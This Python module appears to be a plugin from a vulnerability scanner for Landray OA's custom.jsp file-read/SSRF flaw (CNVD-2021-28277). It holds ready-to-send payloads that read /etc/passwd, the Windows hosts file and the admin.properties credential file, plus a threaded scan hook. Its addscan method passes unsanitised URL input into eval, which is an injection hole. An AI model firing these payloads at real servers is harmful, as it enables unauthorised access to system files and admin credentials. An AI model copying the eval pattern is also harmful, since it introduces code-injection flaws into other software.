#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
蓝凌是国内数字化办公专业服务商
    蓝凌OA扫描类: 
        蓝凌OA custom.jsp任意文件读取(SSRF)
            CNVD-2021-28277


file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.thread import thread
from payloads.Landray.cnvd_2021_28277 import cnvd_2021_28277_scan

class Landray():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Landray-OA'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cnvd_2021_28277_payloads = [
            {
                'path': 'sys/ui/extend/varkind/custom.jsp',
                'data': 'var={"body":{"file":"file:///etc/passwd"}}'
            },
            {
                'path': 'sys/ui/extend/varkind/custom.jsp',
                'data': 'var={"body":{"file":"file://C:/Windows/System32/drivers/etc/hosts"}}'
            },
            {
                'path': 'sys/ui/extend/varkind/custom.jsp',
                'data': 'var={"body":{"file":"file://C:\Windows\System32\drivers\etc\hosts"}}'
            },
            {
                'path': 'sys/ui/extend/varkind/custom.jsp',
                'data': 'var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
            },
            {
                'path': 'custom.jsp',
                'data': 'var={"body":{"file":"file:///etc/passwd"}}'
            },
            {
                'path': 'custom.jsp',
                'data': 'var={"body":{"file":"file://C:/Windows/System32/drivers/etc/hosts"}}'
            },
            {
                'path': 'custom.jsp',
                'data': 'var={"body":{"file":"file://C:\Windows\System32\drivers\etc\hosts"}}'
            },
            {
                'path': 'custom.jsp',
                'data': 'var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
            },
        ]

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cnvd_2021_28277_scan, url=url)
        ]

Landray.cnvd_2021_28277_scan = cnvd_2021_28277_scan

landray = Landray()
